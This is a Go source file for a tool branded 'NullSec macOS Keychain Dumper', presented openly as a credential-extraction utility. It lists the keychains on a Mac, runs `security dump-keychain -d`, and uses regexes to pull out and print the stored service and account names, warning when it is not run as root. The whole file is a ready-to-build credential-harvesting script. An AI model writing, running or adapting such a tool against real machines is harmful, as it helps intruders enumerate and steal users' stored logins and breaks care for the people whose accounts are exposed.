// NullSec macOS Keychain Dumper
// Fast credential extraction for macOS
// Build: go build -o nullsec-keychain keychain_dump.go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

type KeychainItem struct {
	Service string
	Account string
	Kind    string
}

func banner() {
	fmt.Println(`
╔═══════════════════════════════════════╗
║   NullSec Keychain Dumper - macOS     ║
║   Fast credential extraction in Go    ║
╚═══════════════════════════════════════╝`)
}

func runSecurity(args ...string) (string, error) {
	cmd := exec.Command("security", args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func listKeychains() []string {
	out, _ := runSecurity("list-keychains")
	var keychains []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(strings.Trim(line, "\""))
		if line != "" {
			keychains = append(keychains, line)
		}
	}
	return keychains
}

func dumpCredentials() []KeychainItem {
	var items []KeychainItem
	out, _ := runSecurity("dump-keychain", "-d")

	svcRe := regexp.MustCompile(`"svce"<blob>="([^"]*)"`)
	acctRe := regexp.MustCompile(`"acct"<blob>="([^"]*)"`)

	services := svcRe.FindAllStringSubmatch(out, -1)
	accounts := acctRe.FindAllStringSubmatch(out, -1)

	for i, svc := range services {
		item := KeychainItem{Service: svc[1], Kind: "generic"}
		if i < len(accounts) {
			item.Account = accounts[i][1]
		}
		items = append(items, item)
	}
	return items
}

func main() {
	banner()
	if os.Geteuid() != 0 {
		fmt.Println("[!] Warning: Running without root may limit access")
	}

	fmt.Println("\n[*] Enumerating keychains...")
	for _, kc := range listKeychains() {
		fmt.Printf("    → %s\n", kc)
	}

	fmt.Println("\n[*] Dumping credentials...")
	creds := dumpCredentials()
	for _, item := range creds {
		fmt.Printf("    [%s] %s | %s\n", item.Kind, item.Service, item.Account)
	}
	fmt.Printf("\n[✓] Found %d credentials\n", len(creds))
}
